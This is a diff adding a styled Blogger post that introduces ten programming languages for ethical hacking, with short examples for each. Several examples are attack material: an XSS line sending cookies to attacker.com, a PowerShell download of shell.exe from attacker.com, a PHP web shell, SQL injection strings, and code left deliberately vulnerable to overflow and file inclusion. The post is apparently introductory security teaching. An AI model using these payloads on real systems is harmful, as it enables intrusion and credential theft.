@@ -1,0 +1,697 @@
+<!-- ===== PROGRAMMING LANGUAGES FOR ETHICAL HACKING - CYBERSUME FULL SCREEN BLACK EDITION ===== -->
+<!-- Isko Blogger Post Editor mein HTML mode mein paste karein -->
+
+<style>
+    /* ===== FULL SCREEN WRAPPER ===== */
+    .cyber-post-wrapper {
+        width: 100% !important;
+        max-width: 100% !important;
+        margin: 0 !important;
+        padding: 30px 40px 50px !important;
+        background: #000000 !important;
+        color: #ffffff;
+        border-radius: 0 !important;
+        box-sizing: border-box;
+        min-height: 100vh;
+    }
+    
+    @media (max-width: 1200px) {
+        .cyber-post-wrapper { padding: 25px 35px 45px !important; }
+    }
+    @media (max-width: 992px) {
+        .cyber-post-wrapper { padding: 22px 30px 40px !important; }
+    }
+    @media (max-width: 768px) {
+        .cyber-post-wrapper { padding: 18px 22px 35px !important; }
+    }
+    @media (max-width: 600px) {
+        .cyber-post-wrapper { padding: 15px 18px 30px !important; }
+    }
+    @media (max-width: 480px) {
+        .cyber-post-wrapper { padding: 12px 14px 25px !important; }
+    }
+    
+    .cyber-content {
+        max-width: 1100px;
+        margin: 0 auto;
+        padding: 0;
+    }
+    
+    /* ===== POST HEADER ===== */
+    .post-header-cyber {
+        margin-bottom: 35px;
+        padding-bottom: 25px;
+        border-bottom: 2px solid rgba(0, 255, 136, 0.1);
+        text-align: center;
+    }
+    
+    .post-badge {
+        display: inline-block;
+        padding: 6px 26px;
+        background: rgba(0, 255, 136, 0.08);
+        border: 1px solid #00ff88;
+        border-radius: 50px;
+        color: #00ff88;
+        font-size: 13px;
+        text-transform: uppercase;
+        letter-spacing: 3px;
+        margin-bottom: 20px;
+    }
+    
+    .post-title-cyber {
+        font-size: 38px;
+        font-weight: 900;
+        line-height: 1.15;
+        color: #ffffff !important;
+        margin: 12px 0 18px;
+        letter-spacing: -0.5px;
+        text-align: center;
+    }
+    
+    .post-title-cyber strong {
+        color: #00ff88;
+    }
+    
+    .post-description {
+        color: #b0b8c8;
+        font-size: 17px;
+        line-height: 1.8;
+        max-width: 700px;
+        margin: 0 auto;
+        text-align: center;
+    }
+    
+    @media (max-width: 992px) {
+        .post-title-cyber { font-size: 30px; }
+    }
+    @media (max-width: 768px) {
+        .post-title-cyber { font-size: 24px; }
+        .post-description { font-size: 15px; }
+    }
+    @media (max-width: 480px) {
+        .post-title-cyber { font-size: 20px; }
+    }
+    
+    /* ===== LANGUAGE CARD ===== */
+    .lang-card {
+        background: #0a0a0a;
+        border: 1px solid rgba(0, 255, 136, 0.06);
+        border-radius: 14px;
+        padding: 24px 28px;
+        margin: 20px 0 30px;
+        transition: 0.3s;
+    }
+    
+    .lang-card:hover {
+        border-color: rgba(0, 255, 136, 0.15);
+        transform: translateY(-2px);
+        box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+    }
+    
+    .lang-card .lang-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 10px;
+        margin-bottom: 12px;
+    }
+    
+    .lang-card .lang-name {
+        font-size: 24px;
+        font-weight: 900;
+        color: #00ff88;
+    }
+    
+    .lang-card .lang-name a {
+        color: #00ff88;
+        text-decoration: none;
+        transition: 0.3s;
+    }
+    
+    .lang-card .lang-name a:hover {
+        color: #00d9ff;
+        text-decoration: underline;
+    }
+    
+    .lang-card .lang-badge {
+        padding: 4px 16px;
+        border-radius: 50px;
+        background: rgba(0, 255, 136, 0.1);
+        color: #00ff88;
+        font-size: 12px;
+        font-weight: 700;
+        border: 1px solid rgba(0, 255, 136, 0.15);
+    }
+    
+    .lang-card .lang-why {
+        color: #b0b8c8;
+        font-size: 16px;
+        margin-bottom: 10px;
+    }
+    
+    .lang-card .lang-why strong {
+        color: #ffffff;
+    }
+    
+    .lang-card .lang-uses {
+        color: #b0b8c8;
+        font-size: 15px;
+        line-height: 2;
+        padding-left: 20px;
+        margin: 8px 0 12px;
+    }
+    
+    .lang-card .lang-uses li {
+        list-style: none;
+        padding-left: 20px;
+        position: relative;
+    }
+    
+    .lang-card .lang-uses li::before {
+        content: "✔";
+        color: #00ff88;
+        position: absolute;
+        left: 0;
+    }
+    
+    .lang-card .lang-example {
+        background: #050816;
+        border: 1px solid rgba(0, 255, 136, 0.08);
+        border-radius: 10px;
+        padding: 16px 20px;
+        margin: 10px 0 15px;
+        overflow-x: auto;
+    }
+    
+    .lang-card .lang-example .lang-label {
+        color: #6a7290;
+        font-size: 12px;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin-bottom: 6px;
+    }
+    
+    .lang-card .lang-example code {
+        color: #b0b8c8;
+        font-family: 'Courier New', monospace;
+        font-size: 14px;
+        line-height: 1.8;
+        white-space: pre-wrap;
+        word-break: break-all;
+    }
+    
+    .lang-card .lang-example code .comment {
+        color: #6a7290;
+    }
+    
+    .lang-card .lang-example code .keyword {
+        color: #ffcc00;
+    }
+    
+    .lang-card .lang-example code .string {
+        color: #00d9ff;
+    }
+    
+    .lang-card .lang-example code .function {
+        color: #00ff88;
+    }
+    
+    .lang-card .lang-example code .variable {
+        color: #ff6b6b;
+    }
+    
+    .lang-card .lang-book {
+        display: inline-block;
+        padding: 8px 24px;
+        border-radius: 8px;
+        background: linear-gradient(135deg, #00ff88, #00cc77);
+        color: #000000;
+        font-weight: 700;
+        font-size: 14px;
+        text-decoration: none;
+        transition: 0.3s;
+        margin-top: 5px;
+    }
+    
+    .lang-card .lang-book:hover {
+        transform: scale(1.04);
+        box-shadow: 0 0 30px rgba(0, 255, 136, 0.2);
+    }
+    
+    @media (max-width: 600px) {
+        .lang-card {
+            padding: 18px 16px;
+        }
+        .lang-card .lang-name {
+            font-size: 20px;
+        }
+        .lang-card .lang-example code {
+            font-size: 12px;
+        }
+    }
+    
+    /* ===== ROADMAP ===== */
+    .roadmap-box {
+        background: linear-gradient(135deg, rgba(0, 255, 136, 0.03), rgba(0, 217, 255, 0.03));
+        border: 1px solid rgba(0, 255, 136, 0.08);
+        border-radius: 14px;
+        padding: 24px 30px;
+        margin: 30px 0 35px;
+    }
+    
+    .roadmap-box h2 {
+        color: #00ff88;
+        font-size: 22px;
+        font-weight: 800;
+        margin-bottom: 15px;
+        text-align: center;
+    }
+    
+    .roadmap-box .steps {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px 30px;
+    }
+    
+    .roadmap-box .steps .step {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        color: #b0b8c8;
+        font-size: 15px;
+        padding: 6px 0;
+    }
+    
+    .roadmap-box .steps .step .num {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 30px;
+        height: 30px;
+        border-radius: 50%;
+        background: rgba(0, 255, 136, 0.1);
+        color: #00ff88;
+        font-weight: 700;
+        font-size: 14px;
+        flex-shrink: 0;
+    }
+    
+    .roadmap-box .pro-tip {
+        text-align: center;
+        color: #ffcc00;
+        font-size: 16px;
+        font-weight: 700;
+        margin-top: 15px;
+        padding-top: 15px;
+        border-top: 1px solid rgba(255, 204, 0, 0.1);
+    }
+    
+    @media (max-width: 600px) {
+        .roadmap-box .steps {
+            grid-template-columns: 1fr;
+        }
+        .roadmap-box {
+            padding: 18px 16px;
+        }
+    }
+    
+    /* ===== HORIZONTAL RULE ===== */
+    .cyber-post-wrapper hr {
+        border: none;
+        border-top: 1px solid rgba(0, 255, 136, 0.06);
+        margin: 30px 0 32px;
+        background: transparent;
+        height: 1px;
+    }
+    
+    /* ===== SHARE SECTION ===== */
+    .share-section {
+        margin-top: 50px;
+        padding-top: 30px;
+        border-top: 1px solid rgba(0, 255, 136, 0.08);
+    }
+    .share-section p {
+        color: #6a7290 !important;
+        font-size: 15px;
+        text-align: center;
+        margin-bottom: 16px !important;
+    }
+    .share-buttons {
+        display: flex;
+        gap: 16px;
+        justify-content: center;
+        flex-wrap: wrap;
+    }
+    .share-buttons a {
+        padding: 12px 28px;
+        border: 1px solid rgba(0, 255, 136, 0.12);
+        border-radius: 10px;
+        color: #b0b8c8 !important;
+        text-decoration: none;
+        font-size: 15px;
+        font-weight: 500;
+        transition: 0.3s;
+        background: transparent;
+    }
+    .share-buttons a:hover {
+        border-color: #00ff88;
+        color: #00ff88 !important;
+        background: rgba(0, 255, 136, 0.04);
+        transform: translateY(-2px);
+    }
+    @media (max-width: 480px) {
+        .share-buttons a { padding: 10px 18px; font-size: 13px; }
+        .share-section { margin-top: 35px; padding-top: 22px; }
+    }
+    
+    /* ===== BLOGGER OVERRIDES ===== */
+    .blog-posts { max-width: 100% !important; padding: 0 !important; }
+    .post-body { padding: 0 !important; background: #000000 !important; }
+    .post-body-content { background: #000000 !important; padding: 0 !important; }
+    .post-outer { background: #000000 !important; padding: 0 !important; margin: 0 !important; border: none !important; box-shadow: none !important; }
+    .post { background: #000000 !important; padding: 0 !important; margin: 0 !important; border: none !important; box-shadow: none !important; }
+    
+    /* ===== LINK STYLES ===== */
+    .cyber-post-wrapper a { color: #00ff88; text-decoration: none; transition: 0.3s; }
+    .cyber-post-wrapper a:hover { color: #00d9ff; text-decoration: underline; }
+    .text-center { text-align: center; }
+    .mt-10 { margin-top: 10px; }
+</style>
+
+<!-- ===== MAIN CONTENT ===== -->
+<div class="cyber-post-wrapper">
+
+    <div class="cyber-content">
+
+        <!-- ===== POST HEADER ===== -->
+        <div class="post-header-cyber">
+            <div class="post-badge">💻 Cybersecurity Training</div>
+            <h1 class="post-title-cyber">Programming Languages for <strong>Ethical Hacking</strong></h1>
+            <p class="post-description">
+                Here's a list of programming languages essential for ethical hacking and cybersecurity training, along with their key uses and learning priorities.
+            </p>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 1. PYTHON -->
+        <!-- ============================================================ -->
+        <div class="lang-card">
+            <div class="lang-header">
+                <div class="lang-name"><a href="https://www.cybersume.xyz/2026/07/introduction-welcome-to-world-of-python.html" target="_blank">1. Python</a></div>
+                <span class="lang-badge">⭐ Must Learn</span>
+            </div>
+            <div class="lang-why">
+                <strong>Why Learn?</strong> #1 language for hacking and cybersecurity career (readable, versatile, vast libraries). Used for exploit development, automation, and tool creation.
+            </div>
+            <div class="lang-uses">
+                <li>Writing custom exploits (e.g., buffer overflows)</li>
+                <li>Automating attacks (e.g., brute-forcing, scraping)</li>
+                <li>Malware analysis &amp; reverse engineering</li>
+            </div>
+            <div class="lang-example">
+                <div class="lang-label">📄 Example: Simple Socket Connection</div>
+                <code><span class="keyword">import</span> socket
+
+<span class="variable">target</span> = <span class="string">"192.168.1.1"</span>
+<span class="variable">s</span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+<span class="variable">s</span>.connect((<span class="variable">target</span>, <span class="number">80</span>))
+<span class="variable">s</span>.send(<span class="string">b"GET / HTTP/1.1\r\nHost: google.com\r\n\r\n"</span>)
+<span class="function">print</span>(<span class="variable">s</span>.recv(<span class="number">1024</span>).decode())</code>
+            </div>
+            <a class="lang-book" href="https://sumetech98-afk.github.io/Python_for-Hacker/" target="_blank">📚 For Advance skill Download Book</a>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 2. BASH -->
+        <!-- ============================================================ -->
+        <div class="lang-card">
+            <div class="lang-header">
+                <div class="lang-name"><a href="https://www.cybersume.xyz/2026/07/bash-scripting-for-ethical-hackers.html" target="_blank">2. Bash Scripting</a></div>
+                <span class="lang-badge">🐧 Linux Essential</span>
+            </div>
+            <div class="lang-why">
+                <strong>Why Learn?</strong> Critical for Linux-based hacking and cybersecurity career (Kali Linux). Automates repetitive tasks (scanning, payloads).
+            </div>
+            <div class="lang-uses">
+                <li>Network scanning (e.g., <code>for ip in {1..254}; do ping -c 1 192.168.1.$ip; done</code>)</li>
+                <li>Post-exploitation (e.g., data exfiltration)</li>
+            </div>
+            <div class="lang-example">
+                <div class="lang-label">📄 Example: Port Scanner</div>
+                <code><span class="comment">#!/bin/bash</span>
+<span class="keyword">for</span> port <span class="keyword">in</span> {1..65535}; <span class="keyword">do</span>
+    timeout 1 bash -c <span class="string">"echo >/dev/tcp/192.168.1.1/$port"</span> &amp;&amp; <span class="function">echo</span> <span class="string">"Port $port OPEN"</span>
+<span class="keyword">done</span></code>
+            </div>
+            <a class="lang-book" href="https://sumetech98-afk.github.io/bashscriptin_post/" target="_blank">📚 For Advance You can Download Book Here</a>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 3. JAVASCRIPT -->
+        <!-- ============================================================ -->
+        <div class="lang-card">
+            <div class="lang-header">
+                <div class="lang-name"><a href="https://www.cybersume.xyz/2026/07/javascript-essentials.html" target="_blank">3. JavaScript</a></div>
+                <span class="lang-badge">🌐 Web Hacking</span>
+            </div>
+            <div class="lang-why">
+                <strong>Why Learn?</strong> Web hacking (XSS, CSRF, API exploits). Manipulate browser/DOM for attacks.
+            </div>
+            <div class="lang-uses">
+                <li>Crafting XSS payloads (<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>)</li>
+                <li>Node.js for server-side exploits</li>
+            </div>
+            <div class="lang-example">
+                <div class="lang-label">📄 Example: Cookie Stealing via XSS</div>
+                <code><span class="comment">// Stealing cookies via XSS</span>
+<span class="function">fetch</span>(<span class="string">'http://attacker.com/log?cookie='</span> + document.cookie);</code>
+            </div>
+            <a class="lang-book" href="https://sumetech98-afk.github.io/javascript_post/" target="_blank">📚 For Advance You can Download Book Here</a>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 4. SQL -->
+        <!-- ============================================================ -->
+        <div class="lang-card">
+            <div class="lang-header">
+                <div class="lang-name"><a href="https://www.cybersume.xyz/2026/07/sql-for-beginners.html" target="_blank">4. SQL</a></div>
+                <span class="lang-badge">🗄️ Database Hacking</span>
+            </div>
+            <div class="lang-why">
+                <strong>Why Learn?</strong> Database hacking (SQL injection, data theft). Understand backend queries.
+            </div>
+            <div class="lang-uses">
+                <li>Exploiting SQLi (<code>' OR 1=1 -- -</code>)</li>
+                <li>Bypassing authentication</li>
+            </div>
+            <div class="lang-example">
+                <div class="lang-label">📄 Example: UNION Injection</div>
+                <code><span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users<span class="comment">--</span></code>
+            </div>
+            <a class="lang-book" href="https://sumetech98-afk.github.io/sql_post/" target="_blank">📚 For Advance You can Download Book Here</a>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 5. C/C++ -->
+        <!-- ============================================================ -->
+        <div class="lang-card">
+            <div class="lang-header">
+                <div class="lang-name"><a href="https://www.cybersume.xyz/2026/07/master-c-and-c-programming.html" target="_blank">5. C/C++</a></div>
+                <span class="lang-badge">⚙️ Low-Level</span>
+            </div>
+            <div class="lang-why">
+                <strong>Why Learn?</strong> Low-level exploits (buffer overflows, rootkits). Reverse engineering binaries.
+            </div>
+            <div class="lang-uses">
+                <li>Writing shellcode</li>
+                <li>Exploiting memory corruption</li>
+            </div>
+            <div class="lang-example">
+                <div class="lang-label">📄 Example: Buffer Overflow Vulnerability</div>
+                <code><span class="keyword">#include</span> &lt;stdio.h&gt;
+
+<span class="keyword">int</span> <span class="function">main</span>() {
+    <span class="keyword">char</span> <span class="variable">buffer</span>[<span class="number">10</span>];
+    <span class="function">gets</span>(<span class="variable">buffer</span>); <span class="comment">// Vulnerable to overflow</span>
+    <span class="keyword">return</span> <span class="number">0</span>;
+}</code>
+            </div>
+            <a class="lang-book" href="https://sumetech98-afk.github.io/c-c-_post/" target="_blank">📚 For Advance You can Download Book Here</a>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 6. POWERSHELL -->
+        <!-- ============================================================ -->
+        <div class="lang-card">
+            <div class="lang-header">
+                <div class="lang-name"><a href="https://www.cybersume.xyz/2026/07/master-windows-automation-with.html" target="_blank">6. PowerShell</a></div>
+                <span class="lang-badge">🪟 Windows Hacking</span>
+            </div>
+            <div class="lang-why">
+                <strong>Why Learn?</strong> Windows hacking (post-exploitation, AD attacks). Bypasses AV/restrictions.
+            </div>
+            <div class="lang-uses">
+                <li>Lateral movement in Windows</li>
+                <li>Credential dumping (<code>Invoke-Mimikatz</code>)</li>
+            </div>
+            <div class="lang-example">
+                <div class="lang-label">📄 Example: Download and Execute</div>
+                <code><span class="function">Invoke-WebRequest</span> <span class="string">"http://attacker.com/shell.exe"</span> -OutFile <span class="string">"C:\Temp\shell.exe"</span></code>
+            </div>
+            <a class="lang-book" href="https://sumetech98-afk.github.io/powershell_post/" target="_blank">📚 For Advance You can Download Book Here</a>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 7. RUBY -->
+        <!-- ============================================================ -->
+        <div class="lang-card">
+            <div class="lang-header">
+                <div class="lang-name"><a href="https://www.cybersume.xyz/2026/07/learn-ruby-programming.html" target="_blank">7. Ruby</a></div>
+                <span class="lang-badge">🔴 Metasploit</span>
+            </div>
+            <div class="lang-why">
+                <strong>Why Learn?</strong> Metasploit modules are written in Ruby. Quick exploit prototyping.
+            </div>
+            <div class="lang-uses">
+                <li>Custom Metasploit exploits</li>
+                <li>Web app testing</li>
+            </div>
+            <div class="lang-example">
+                <div class="lang-label">📄 Example: Simple TCP Server</div>
+                <code><span class="comment"># Simple TCP server</span>
+<span class="keyword">require</span> <span class="string">'socket'</span>
+
+<span class="variable">server</span> = TCPServer.<span class="function">new</span> <span class="number">4444</span>
+<span class="variable">client</span> = <span class="variable">server</span>.<span class="function">accept</span>
+<span class="variable">client</span>.<span class="function">puts</span> <span class="string">"Hacked!"</span></code>
+            </div>
+            <a class="lang-book" href="https://sumetech98-afk.github.io/Ruby_Post/" target="_blank">📚 For Advance You can Download Book Here</a>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 8. PHP -->
+        <!-- ============================================================ -->
+        <div class="lang-card">
+            <div class="lang-header">
+                <div class="lang-name"><a href="https://www.cybersume.xyz/2026/07/php-programming-for-ethical-hackers.html" target="_blank">8. PHP</a></div>
+                <span class="lang-badge">🌐 Web Vulnerabilities</span>
+            </div>
+            <div class="lang-why">
+                <strong>Why Learn?</strong> Web app vulnerabilities (RCE, LFI/RFI). Analyze CMS exploits (WordPress, Joomla).
+            </div>
+            <div class="lang-uses">
+                <li>Crafting web shells (<code>&lt;?php system($_GET['cmd']); ?&gt;</code>)</li>
+                <li>Understanding server-side flaws</li>
+            </div>
+            <div class="lang-example">
+                <div class="lang-label">📄 Example: LFI Vulnerability</div>
+                <code><span class="keyword">&lt;?php</span>
+<span class="keyword">if</span> (<span class="function">isset</span>(<span class="variable">$_GET</span>[<span class="string">'file'</span>])) {
+    <span class="function">include</span>(<span class="variable">$_GET</span>[<span class="string">'file'</span>]); <span class="comment">// LFI vulnerability</span>
+}
+<span class="keyword">?&gt;</span></code>
+            </div>
+            <a class="lang-book" href="https://sumetech98-afk.github.io/php_post/" target="_blank">📚 For Advance You can Download Book Here</a>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 9. ASSEMBLY -->
+        <!-- ============================================================ -->
+        <div class="lang-card">
+            <div class="lang-header">
+                <div class="lang-name">9. Assembly (x86/ARM)</div>
+                <span class="lang-badge">🔬 Malware Analysis</span>
+            </div>
+            <div class="lang-why">
+                <strong>Why Learn?</strong> Malware analysis &amp; exploit dev. Understand CPU-level attacks.
+            </div>
+            <div class="lang-uses">
+                <li>Writing shellcode</li>
+                <li>Reverse engineering malware</li>
+            </div>
+            <div class="lang-example">
+                <div class="lang-label">📄 Example: Hello World Shellcode</div>
+                <code><span class="keyword">section</span> .text
+<span class="keyword">global</span> _start
+
+<span class="keyword">_start:</span>
+    <span class="keyword">mov</span> eax, <span class="number">4</span>    <span class="comment">; sys_write</span>
+    <span class="keyword">mov</span> ebx, <span class="number">1</span>    <span class="comment">; stdout</span>
+    <span class="keyword">mov</span> ecx, msg   <span class="comment">; buffer</span>
+    <span class="keyword">mov</span> edx, len   <span class="comment">; length</span>
+    <span class="keyword">int</span> 0x80        <span class="comment">; syscall</span>
+
+msg db <span class="string">"Hacked!"</span>, 0xa
+len equ $ - msg</code>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 10. GO -->
+        <!-- ============================================================ -->
+        <div class="lang-card">
+            <div class="lang-header">
+                <div class="lang-name">10. Go (Golang)</div>
+                <span class="lang-badge">🚀 Modern Malware</span>
+            </div>
+            <div class="lang-why">
+                <strong>Why Learn?</strong> Modern malware/RATs use Go. Cross-platform exploits.
+            </div>
+            <div class="lang-uses">
+                <li>Building stealthy malware</li>
+                <li>Network tools (scanners, proxies)</li>
+            </div>
+            <div class="lang-example">
+                <div class="lang-label">📄 Example: Simple HTTP Server</div>
+                <code><span class="keyword">package</span> main
+
+<span class="keyword">import</span> <span class="string">"net/http"</span>
+
+<span class="keyword">func</span> <span class="function">main</span>() {
+    http.<span class="function">HandleFunc</span>(<span class="string">"/"</span>, <span class="keyword">func</span>(w http.ResponseWriter, r *http.Request) {
+        w.<span class="function">Write</span>([]<span class="keyword">byte</span>(<span class="string">"Hacked!"</span>))
+    })
+    http.<span class="function">ListenAndServe</span>(<span class="string">":8080"</span>, <span class="keyword">nil</span>)
+}</code>
+            </div>
+        </div>
+
+        <hr/>
+
+        <!-- ============================================================ -->
+        <!-- ROADMAP -->
+        <!-- ============================================================ -->
+        <div class="roadmap-box">
+            <h2>📈 Cybersecurity Learning Roadmap</h2>
+            <div class="steps">
+                <div class="step"><span class="num">1</span> Start with <strong style="color:#00ff88;">Python/Bash</strong> (automation basics)</div>
+                <div class="step"><span class="num">2</span> Add <strong style="color:#00ff88;">JavaScript/SQL</strong> (web hacking)</div>
+                <div class="step"><span class="num">3</span> Learn <strong style="color:#00ff88;">C/PowerShell</strong> (low-level/Windows)</div>
+                <div class="step"><span class="num">4</span> Explore <strong style="color:#00ff88;">Assembly</strong> (advanced exploits)</div>
+            </div>
+            <div class="pro-tip">🚀 Pro Tip: Use TryHackMe / HTB challenges to practice!</div>
+        </div>
+
+        <hr/>
+
+        <!-- ===== SHARE SECTION ===== -->
+        <div class="share-section">
+            <p>📤 Share this post with your network</p>
+            <div class="share-buttons">
+                <a href="#" onclick="window.open('https://twitter.com/intent/tweet?text=Programming%20Languages%20for%20Ethical%20Hacking%20-%20Complete%20Guide!%20%23CyberSecurity%20%23EthicalHacking%20%23Programming','_blank');return false;">
+                    🐦 Twitter
+                </a>
+                <a href="#" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(window.location.href),'_blank');return false;">
+                    📘 Facebook
+                </a>
+                <a href="#" onclick="window.open('https://www.linkedin.com/sharing/share-offsite/?url='+encodeURIComponent(window.location.href),'_blank');return false;">
+                    💼 LinkedIn
+                </a>
+            </div>
+        </div>
+
+    </div>
+
+</div>
